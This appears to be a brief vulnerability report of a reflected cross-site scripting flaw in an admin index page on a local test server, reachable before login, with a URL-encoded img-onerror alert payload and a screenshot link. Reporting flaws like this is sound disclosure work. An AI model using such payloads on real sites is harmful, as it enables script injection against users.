# name 
reflection xss

# path
http://127.0.0.1:9999/admin/index
befor login

# xss Payload

http://127.0.0.1:9999/admin/index/%3Cimg%20src=lll%20onerror=alert(111)%3E%3C!--

# image

[![](./img/xss1.png)](./img/xss1.png)